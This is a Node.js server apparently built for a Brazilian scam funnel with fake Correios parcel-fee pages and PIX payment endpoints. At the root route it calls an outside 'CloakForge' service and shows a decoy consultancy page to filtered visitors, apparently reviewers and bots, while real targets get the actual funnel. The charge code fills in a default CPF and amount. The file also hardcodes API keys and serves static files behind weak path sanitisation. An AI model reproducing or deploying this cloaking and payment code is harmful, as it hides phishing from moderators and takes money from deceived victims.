const http = require('http');
const fs = require('fs');
const path = require('path');
const url = require('url');
const https = require('https');

// ==========================================
// CONSTANTES DO ROUTER CLOAKFORGE & VARIANTES
// ==========================================
const PRIMARY_URL = null; // null = emite Variant A (index.html local). Se definido com URL externa, faz 302.
const CLOAK_SLUG = 'clear-room';
const CLOAK_KEY = 'KfZy3qIC_wEnTGW15m8iwwtZgZ8TY2wR';
const CLOAK_API_ENDPOINT = 'https://cloakforge.app.br/api/cloak/decide';

const VARIANT_B_HTML = `<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>João Consultoria & Gestão Empresarial | Guia de Produtividade e Negócios</title>
  <meta name="description" content="Consultoria especializada em diagnóstico empresarial, gestão financeira eficiente e estruturação estratégica para pequenas e médias empresas.">
  <style>
    :root {
      --primary: #1e3a8a;
      --primary-dark: #0f172a;
      --accent: #2563eb;
      --bg: #f8fafc;
      --card-bg: #ffffff;
      --text: #1e293b;
      --text-muted: #64748b;
      --border: #e2e8f0;
    }
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
      background-color: var(--bg);
      color: var(--text);
      line-height: 1.6;
    }
    header {
      background: #ffffff;
      border-bottom: 1px solid var(--border);
      position: sticky;
      top: 0;
      z-index: 40;
    }
    .nav-container {
      max-width: 1100px;
      margin: 0 auto;
      padding: 16px 20px;
      display: flex;
      justify-content: space-between;
      align-items: center;
    }
    .brand {
      font-weight: 800;
      font-size: 1.25rem;
      color: var(--primary);
      text-decoration: none;
      display: flex;
      align-items: center;
      gap: 8px;
    }
    .brand span {
      background: var(--primary);
      color: #fff;
      padding: 4px 8px;
      border-radius: 6px;
      font-size: 0.85rem;
    }
    nav a {
      color: var(--text-muted);
      text-decoration: none;
      font-size: 0.9rem;
      font-weight: 600;
      margin-left: 20px;
      transition: color 0.2s;
    }
    nav a:hover { color: var(--accent); }
    .hero {
      background: linear-gradient(135deg, #0f172a 0%, #1e3a8a 100%);
      color: #ffffff;
      padding: 60px 20px;
      text-align: center;
    }
    .hero h1 {
      font-size: 2.2rem;
      font-weight: 800;
      max-width: 800px;
      margin: 0 auto 16px;
      line-height: 1.25;
    }
    .hero p {
      font-size: 1.1rem;
      color: #cbd5e1;
      max-width: 650px;
      margin: 0 auto;
    }
    .main-container {
      max-width: 1100px;
      margin: 40px auto;
      padding: 0 20px;
      display: grid;
      grid-template-columns: 2fr 1fr;
      gap: 32px;
    }
    @media (max-width: 768px) {
      .main-container { grid-template-columns: 1fr; }
      .hero h1 { font-size: 1.7rem; }
    }
    .article-card {
      background: var(--card-bg);
      border: 1px solid var(--border);
      border-radius: 12px;
      padding: 32px;
      box-shadow: 0 1px 3px rgba(0,0,0,0.05);
    }
    .tag {
      display: inline-block;
      background: #eff6ff;
      color: var(--accent);
      font-weight: 700;
      font-size: 0.75rem;
      padding: 4px 10px;
      border-radius: 20px;
      text-transform: uppercase;
      letter-spacing: 0.05em;
      margin-bottom: 12px;
    }
    .article-card h2 {
      font-size: 1.6rem;
      margin-bottom: 16px;
      color: var(--primary-dark);
      line-height: 1.3;
    }
    .article-meta {
      font-size: 0.85rem;
      color: var(--text-muted);
      margin-bottom: 24px;
      border-bottom: 1px solid var(--border);
      padding-bottom: 12px;
    }
    .article-body p {
      margin-bottom: 16px;
      color: #334155;
    }
    .article-body h3 {
      font-size: 1.25rem;
      margin: 24px 0 12px;
      color: var(--primary-dark);
    }
    .sidebar-card {
      background: var(--card-bg);
      border: 1px solid var(--border);
      border-radius: 12px;
      padding: 24px;
      margin-bottom: 24px;
      box-shadow: 0 1px 3px rgba(0,0,0,0.05);
    }
    .sidebar-card h3 {
      font-size: 1.1rem;
      margin-bottom: 14px;
      color: var(--primary-dark);
      border-bottom: 2px solid var(--accent);
      padding-bottom: 6px;
      display: inline-block;
    }
    .service-list {
      list-style: none;
    }
    .service-list li {
      padding: 10px 0;
      border-bottom: 1px solid #f1f5f9;
      font-size: 0.92rem;
      font-weight: 500;
    }
    .service-list li:last-child { border: none; }
    footer {
      background: #0f172a;
      color: #94a3b8;
      padding: 40px 20px;
      margin-top: 60px;
      font-size: 0.88rem;
    }
    .footer-container {
      max-width: 1100px;
      margin: 0 auto;
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
      gap: 20px;
    }
    .footer-links a {
      color: #cbd5e1;
      text-decoration: none;
      margin-left: 16px;
      cursor: pointer;
    }
    .footer-links a:hover { text-decoration: underline; }
    .modal {
      display: none;
      position: fixed;
      top: 0; left: 0;
      width: 100%; height: 100%;
      background: rgba(15,23,42,0.7);
      backdrop-filter: blur(4px);
      z-index: 100;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }
    .modal.active { display: flex; }
    .modal-content {
      background: #ffffff;
      border-radius: 12px;
      max-width: 650px;
      max-height: 80vh;
      overflow-y: auto;
      padding: 28px;
      box-shadow: 0 20px 25px -5px rgba(0,0,0,0.2);
    }
    .modal-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      margin-bottom: 16px;
      border-bottom: 1px solid var(--border);
      padding-bottom: 12px;
    }
    .modal-close {
      background: none;
      border: none;
      font-size: 1.5rem;
      cursor: pointer;
      color: var(--text-muted);
    }
  </style>
</head>
<body>
  <header>
    <div class="nav-container">
      <a href="/" class="brand">
        <span>JG</span> João Consultoria & Guia
      </a>
      <nav>
        <a href="#artigo">Artigo</a>
        <a href="#servicos">Metodologia</a>
        <a href="javascript:void(0)" onclick="openModal('modalPrivacidade')">Privacidade</a>
        <a href="javascript:void(0)" onclick="openModal('modalTermos')">Termos</a>
      </nav>
    </div>
  </header>

  <section class="hero">
    <h1>Estratégia, Planejamento e Crescimento Sustentável para Empresas</h1>
    <p>Orientações práticas para otimização de rotinas, controle orçamentário e estruturação de negócios no mercado atual.</p>
  </section>

  <main class="main-container">
    <article class="article-card" id="artigo">
      <span class="tag">Gestão & Estratégia</span>
      <h2>Os 5 Fundamentos da Eficiência Financeira e Governança Operacional</h2>
      <div class="article-meta">Por João Silva — Consultor em Gestão e Estruturação de Processos • Atualizado em 2026</div>
      <div class="article-body">
        <p>A longevidade e a competitividade de qualquer empreendimento dependem diretamente de processos operacionais padronizados e de uma vigilância rigorosa sobre a saúde orçamentária. Em cenários de volatilidade econômica, empresas que dominam a leitura de seus indicadores de desempenho destacam-se com facilidade.</p>
        
        <h3>1. Gestão Contínua do Fluxo de Caixa</h3>
        <p>O fluxo de caixa operacional não é apenas um demonstrativo contábil, mas o oxigênio da operação cotidiana. Manter a conciliação bancária atualizada e simular cenários futuros previne surpresas com obrigações e permite identificar sazonalidades no faturamento.</p>

        <h3>2. Otimização de Custos e Auditoria de Despesas</h3>
        <p>Diferenciar custos estratégicos (aqueles que alavancam valor) de despesas supérfluas é o primeiro passo para uma margem operacional saudável. Uma auditoria periódica em contratos de fornecedores e serviços recorrentes é recomendada semestralmente.</p>

        <h3>3. Padronização e Produtividade Operacional</h3>
        <p>Gargalos operacionais geram retrabalho e insatisfação nos clientes. A adoção de manuais de procedimentos simplificados e ferramentas de acompanhamento permite que cada colaborador saiba exatamente o que entregar com qualidade consistente.</p>

        <h3>4. Conformidade Tributária e Governança</h3>
        <p>O planejamento tributário preventivo assegura que a empresa utilize regimes favoráveis e mantenha suas certidões em dia, eliminando passivos e viabilizando linhas de crédito saudáveis.</p>

        <h3>5. Decisões Baseadas em Métricas Concretas</h3>
        <p>O achismo é o maior inimigo do crescimento. Definir KPIs transparentes para faturamento, margem de contribuição e custo de aquisição garante estabilidade e clareza para investimentos futuros.</p>
      </div>
    </article>

    <aside>
      <div class="sidebar-card" id="servicos">
        <h3>Áreas de Orientação</h3>
        <ul class="service-list">
          <li>✓ Diagnóstico e Auditoria Operacional</li>
          <li>✓ Planejamento Orçamentário e Previsão</li>
          <li>✓ Redução de Despesas Administrativas</li>
          <li>✓ Mapeamento e Padronização de Rotinas</li>
          <li>✓ Governança e Melhores Práticas</li>
        </ul>
      </div>

      <div class="sidebar-card">
        <h3>Atendimento Institucional</h3>
        <p style="font-size:0.9rem; color:#475569; margin-bottom:12px;">Para dúvidas corporativas, orçamentos e contato:</p>
        <p style="font-size:0.9rem; font-weight:600; color:var(--primary);">contato@joao-consultorguia.online</p>
        <p style="font-size:0.8rem; color:var(--text-muted); margin-top:8px;">Segunda a Sexta — 09:00 às 18:00 (Horário de Brasília)</p>
      </div>
    </aside>
  </main>

  <footer>
    <div class="footer-container">
      <div>
        <p>© 2026 João Consultoria & Guia Empresarial. Todos os direitos reservados.</p>
        <p style="font-size:0.78rem; margin-top:4px; color:#64748b;">CNPJ: 42.189.304/0001-52 • São Paulo - SP</p>
      </div>
      <div class="footer-links">
        <a onclick="openModal('modalPrivacidade')">Política de Privacidade</a>
        <a onclick="openModal('modalTermos')">Termos de Uso</a>
      </div>
    </div>
  </footer>

  <div id="modalPrivacidade" class="modal">
    <div class="modal-content">
      <div class="modal-header">
        <h3>Política de Privacidade</h3>
        <button class="modal-close" onclick="closeModal('modalPrivacidade')">&times;</button>
      </div>
      <p style="font-size:0.9rem; color:#475569; margin-bottom:12px;">A sua privacidade é fundamental para nós. Esta política descreve como coletamos e protegemos informações durante sua navegação neste portal informativo e institucional.</p>
      <p style="font-size:0.9rem; color:#475569; margin-bottom:12px;">1. Não comercializamos dados pessoais de visitantes a terceiros sob nenhuma circunstância.</p>
      <p style="font-size:0.9rem; color:#475569; margin-bottom:12px;">2. Cookies de navegação anônimos podem ser empregados exclusivamente para finalidades estatísticas e segurança da infraestrutura de servidores.</p>
      <p style="font-size:0.9rem; color:#475569; margin-bottom:12px;">3. Em conformidade com a Lei Geral de Proteção de Dados (LGPD - Lei 13.709/2018), você pode solicitar esclarecimentos via contato@joao-consultorguia.online.</p>
    </div>
  </div>

  <div id="modalTermos" class="modal">
    <div class="modal-content">
      <div class="modal-header">
        <h3>Termos de Uso</h3>
        <button class="modal-close" onclick="closeModal('modalTermos')">&times;</button>
      </div>
      <p style="font-size:0.9rem; color:#475569; margin-bottom:12px;">1. Este website tem caráter exclusivamente informativo, educacional e de apresentação de serviços de consultoria e gestão empresarial.</p>
      <p style="font-size:0.9rem; color:#475569; margin-bottom:12px;">2. Todo o conteúdo textual, estrutura gráfica e artigos são de titularidade do responsável pelo portal, sendo vedada a reprodução sem autorização prévia.</p>
      <p style="font-size:0.9rem; color:#475569; margin-bottom:12px;">3. As orientações contidas nos artigos configuram recomendações de boas práticas e não substituem auditoria contábil formal individualizada.</p>
    </div>
  </div>

  <script>
    function openModal(id) {
      var el = document.getElementById(id);
      if (el) el.classList.add('active');
    }
    function closeModal(id) {
      var el = document.getElementById(id);
      if (el) el.classList.remove('active');
    }
    window.addEventListener('click', function(e) {
      if (e.target.classList.contains('modal')) {
        e.target.classList.remove('active');
      }
    });
  </script>
</body>
</html>`;

// ==========================================
// CLIENT IP RESOLUTION (ORDEM REQUERIDA)
// cf-connecting-ip -> true-client-ip -> x-vercel-forwarded-for ->
// x-real-ip -> x-forwarded-for (first token) -> fly-client-ip -> socket
// ==========================================
function resolveClientIp(req) {
  const h = req.headers || {};
  if (h['cf-connecting-ip']) return String(h['cf-connecting-ip']).trim();
  if (h['true-client-ip']) return String(h['true-client-ip']).trim();
  if (h['x-vercel-forwarded-for']) return String(h['x-vercel-forwarded-for']).split(',')[0].trim();
  if (h['x-real-ip']) return String(h['x-real-ip']).trim();
  if (h['x-forwarded-for']) return String(h['x-forwarded-for']).split(',')[0].trim();
  if (h['fly-client-ip']) return String(h['fly-client-ip']).trim();
  if (req.socket && req.socket.remoteAddress) return req.socket.remoteAddress;
  return '127.0.0.1';
}

// ==========================================
// DECISION CALL DO CLOAKFORGE (SERVER-SIDE)
// ==========================================
function getCloakDecision(clientIp, userAgent, currentUrl, referer, acceptLanguage) {
  return new Promise((resolve) => {
    try {
      const q = new URLSearchParams({
        slug: CLOAK_SLUG,
        key: CLOAK_KEY,
        ip: clientIp || '127.0.0.1',
        ua: userAgent || '',
        url: currentUrl || '',
        ref: referer || '',
        lang: acceptLanguage || ''
      });

      const fullUrl = `${CLOAK_API_ENDPOINT}?${q.toString()}`;
      const req = https.get(fullUrl, { timeout: 2500 }, (res) => {
        let body = '';
        res.on('data', chunk => body += chunk);
        res.on('end', () => {
          try {
            const parsed = JSON.parse(body);
            resolve(parsed || { action: 'block' });
          } catch (_) {
            resolve({ action: 'block' });
          }
        });
      });

      req.on('error', () => resolve({ action: 'block' }));
      req.on('timeout', () => {
        req.destroy();
        resolve({ action: 'block' });
      });
    } catch (_) {
      resolve({ action: 'block' });
    }
  });
}

// ==========================================
// FUNÇÕES AUXILIARES DE PAGAMENTO & STATIC
// ==========================================
const PORT = process.env.PORT || 3000;
const XPAY_API_KEY = process.env.XPAY_API_KEY || 'cpk_live_ex84lopcp2xexagmazz6za11';
const XPAY_BASE_URL = 'https://api.xpaybrasil.com/v1';

function requestHttps(requestUrl, options, bodyData) {
  return new Promise((resolve, reject) => {
    const u = new URL(requestUrl);
    const opts = {
      hostname: u.hostname,
      port: u.port || 443,
      path: u.pathname + u.search,
      method: options.method || 'GET',
      headers: options.headers || {}
    };

    const req = https.request(opts, (res) => {
      let data = '';
      res.on('data', chunk => data += chunk);
      res.on('end', () => {
        let json = null;
        try { json = JSON.parse(data); } catch (_) {}
        resolve({
          status: res.statusCode,
          ok: res.statusCode >= 200 && res.statusCode < 300,
          data: json,
          text: data
        });
      });
    });

    req.on('error', reject);
    if (bodyData) {
      req.write(typeof bodyData === 'string' ? bodyData : JSON.stringify(bodyData));
    }
    req.end();
  });
}

const MIME_TYPES = {
  '.html': 'text/html; charset=utf-8',
  '.css': 'text/css; charset=utf-8',
  '.js': 'application/javascript; charset=utf-8',
  '.json': 'application/json; charset=utf-8',
  '.png': 'image/png',
  '.jpg': 'image/jpeg',
  '.jpeg': 'image/jpeg',
  '.gif': 'image/gif',
  '.svg': 'image/svg+xml',
  '.ico': 'image/x-icon',
  '.woff': 'font/woff',
  '.woff2': 'font/woff2',
  '.ttf': 'font/ttf'
};

const server = http.createServer(async (req, res) => {
  // CORS universal
  res.setHeader('Access-Control-Allow-Origin', '*');
  res.setHeader('Access-Control-Allow-Methods', 'GET, POST, OPTIONS, PUT, DELETE');
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type, X-API-KEY, Authorization, X-Requested-With, Accept, Origin, User-Agent, X-CSRF-Token, *');

  if (req.method === 'OPTIONS') {
    res.writeHead(200);
    return res.end();
  }

  const parsedUrl = url.parse(req.url, true);
  let pathname = decodeURIComponent(parsedUrl.pathname);

  // ==========================================
  // ROTEADOR CONDICIONAL DE SERVIDOR NA RAIZ ("/")
  // ==========================================
  const cleanPath = pathname.replace(/\/+$/, '') || '/';
  if (cleanPath === '/' && req.method === 'GET') {
    const clientIp = resolveClientIp(req);
    const userAgent = req.headers['user-agent'] || '';
    const referer = req.headers['referer'] || req.headers['referrer'] || '';
    const acceptLanguage = req.headers['accept-language'] || '';
    const protocol = (req.headers['x-forwarded-proto'] || 'https');
    const host = req.headers['host'] || 'www.joao-consultorguia.online';
    const fullCurrentUrl = `${protocol}://${host}${req.url}`;

    const decision = await getCloakDecision(clientIp, userAgent, fullCurrentUrl, referer, acceptLanguage);

    if (decision && decision.action === 'allow') {
      if (PRIMARY_URL) {
        res.writeHead(302, { Location: PRIMARY_URL });
        return res.end();
      }
      // Emitir Variante A (conteúdo primário da rota raiz: index.html)
      const variantAPath = path.join(__dirname, 'index.html');
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      return fs.createReadStream(variantAPath).pipe(res);
    }

    // Qualquer outro estado (block, redirect, erro, timeout) -> Emitir Variante B INLINE na mesma rota "/"
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    return res.end(VARIANT_B_HTML);
  }

  // Endpoint 1: Criar Cobrança PIX XPay
  const isCreatePix = (
    pathname === '/api/create-pix' ||
    pathname === '/.netlify/functions/create-pix' ||
    pathname === '/37626323423/api/create-pix' ||
    pathname === '/37626323423/.netlify/functions/create-pix' ||
    pathname.endsWith('/create-pix')
  );

  if (isCreatePix && req.method === 'POST') {
    let body = '';
    req.on('data', chunk => body += chunk);
    req.on('end', async () => {
      try {
        const parsed = JSON.parse(body || '{}');
        const customer = parsed.customerData || parsed.customer || {};

        let cpf = String(customer.cpf || customer.taxId || customer.document || '').replace(/\D/g, '');
        if (cpf.length !== 11) cpf = '07580365316';

        const nome = String(customer.name || customer.nome || 'Contribuinte').trim();
        const email = String(customer.email || ('contato.' + (cpf.slice(0, 6) || 'cliente') + '@gmail.com')).trim();
        let phone = String(customer.phone || customer.telefone || '11999999999').replace(/\D/g, '');
        if (phone.length < 10) phone = '11999999999';

        let rawAmount = parsed.amount;
        let amountInCents = 6856;
        if (typeof rawAmount === 'number') {
          amountInCents = (rawAmount > 0 && rawAmount < 500) ? Math.round(rawAmount * 100) : Math.round(rawAmount);
        } else if (typeof rawAmount === 'string') {
          let p = parseFloat(rawAmount.replace('R$', '').replace(/\s/g, '').replace(',', '.'));
          if (!isNaN(p) && p > 0) amountInCents = p < 500 ? Math.round(p * 100) : Math.round(p);
        }

        const xpayPayload = {
          amount: amountInCents,
          expiresIn: 3600,
          externalId: 'ord_' + Date.now(),
          customer: {
            taxId: cpf,
            name: nome,
            email: email,
            phone: phone
          }
        };

        const xpayRes = await requestHttps(`${XPAY_BASE_URL}/charge/pix`, {
          method: 'POST',
          headers: {
            'X-API-KEY': XPAY_API_KEY,
            'Content-Type': 'application/json',
            'Accept': 'application/json'
          }
        }, xpayPayload);

        if (!xpayRes.ok || !xpayRes.data || !xpayRes.data.id) {
          const errMsg = (xpayRes.data && (xpayRes.data.message || xpayRes.data.error)) || 'Falha ao gerar PIX na XPay';
          res.writeHead(xpayRes.status || 400, { 'Content-Type': 'application/json; charset=utf-8' });
          return res.end(JSON.stringify({ error: errMsg, details: xpayRes.data }));
        }

        const tx = xpayRes.data;
        const txId = tx.id;
        const brCode = tx.brCode || '';
        const brCodeBase64 = tx.brCodeBase64 || '';
        const status = tx.status || 'PROCESSING';

        res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
        res.end(JSON.stringify({
          success: true,
          id: txId,
          transactionId: txId,
          brCode: brCode,
          pixCopiaECola: brCode,
          qrCode: brCode,
          qrCodeBase64: brCodeBase64,
          pix_code: brCode,
          code: brCode,
          status: status,
          data: tx
        }));
      } catch (err) {
        res.writeHead(500, { 'Content-Type': 'application/json; charset=utf-8' });
        res.end(JSON.stringify({ error: err.message || 'Erro interno' }));
      }
    });
    return;
  }

  // Endpoint 2: Verificar Status da Cobrança XPay
  const isCheckStatus = (
    pathname === '/api/check-status' ||
    pathname === '/.netlify/functions/check-status' ||
    pathname === '/37626323423/api/check-status' ||
    pathname === '/37626323423/.netlify/functions/check-status' ||
    pathname.endsWith('/check-status')
  );

  if (isCheckStatus) {
    const id = parsedUrl.query.id || parsedUrl.query.transactionId;
    if (!id) {
      res.writeHead(400, { 'Content-Type': 'application/json; charset=utf-8' });
      return res.end(JSON.stringify({ error: 'ID é obrigatório' }));
    }

    try {
      const xpayRes = await requestHttps(`${XPAY_BASE_URL}/charge/${encodeURIComponent(id)}`, {
        headers: {
          'X-API-KEY': XPAY_API_KEY,
          'Accept': 'application/json'
        }
      });

      const json = xpayRes.data || {};
      const tx = json.data || {};
      const paymentStatus = String(tx.paymentStatus || '').toUpperCase();
      const status = String(tx.status || '').toUpperCase();

      const isPaid = (paymentStatus === 'PAID' || paymentStatus === 'RECIEVED' || status === 'COMPLETED');

      res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
      res.end(JSON.stringify({
        success: true,
        id: id,
        status: isPaid ? 'PAID' : (paymentStatus || status || 'PROCESSING'),
        paymentStatus: paymentStatus,
        isPaid: isPaid,
        paid: isPaid,
        raw: json
      }));
    } catch (err) {
      res.writeHead(500, { 'Content-Type': 'application/json; charset=utf-8' });
      res.end(JSON.stringify({ error: err.message || 'Erro interno' }));
    }
    return;
  }

  // Roteamento explícito do funil
  const ROUTE_MAP = {
    '/correios': 'correios/index.html',
    '/1/confirmacao': '1/confirmacao/index.html',
    '/2/encomenda': '2/encomenda/index.html',
    '/upsell/1': 'upsell/1/index.html',
    '/upsell/2': 'upsell/2/index.html',
    '/upsell/3': 'upsell/3/index.html',
    '/obrigado': 'obrigado/index.html'
  };

  let resolvedRelative = ROUTE_MAP[cleanPath];

  let filePath;
  if (resolvedRelative) {
    filePath = path.join(__dirname, resolvedRelative);
  } else {
    let safePath = pathname.replace(/^(\.\.[\/\\])+/, '');
    filePath = path.join(__dirname, safePath);

    if (fs.existsSync(filePath) && fs.statSync(filePath).isDirectory()) {
      filePath = path.join(filePath, 'index.html');
    }
  }

  // Se o arquivo não existir, tenta caminhos relativos ou fallback para index.html
  if (!fs.existsSync(filePath) || !fs.statSync(filePath).isFile()) {
    const cleanRelative = pathname.replace(/^\/+/, '');
    const tryDirect = path.join(__dirname, cleanRelative);
    if (fs.existsSync(tryDirect) && fs.statSync(tryDirect).isFile()) {
      filePath = tryDirect;
    } else {
      filePath = path.join(__dirname, 'index.html');
    }
  }

  fs.stat(filePath, (err, stats) => {
    if (err || !stats.isFile()) {
      res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
      return fs.createReadStream(path.join(__dirname, 'index.html')).pipe(res);
    }

    const ext = path.extname(filePath).toLowerCase();
    const contentType = MIME_TYPES[ext] || 'application/octet-stream';

    res.writeHead(200, { 'Content-Type': contentType });
    fs.createReadStream(filePath).pipe(res);
  });
});

if (require.main === module) {
  server.listen(PORT, () => {
    console.log(`Servidor rodando na porta ${PORT}`);
    console.log(`Gateway ativo: XPay Brasil (https://api.xpaybrasil.com/v1)`);
  });
}

module.exports = server;
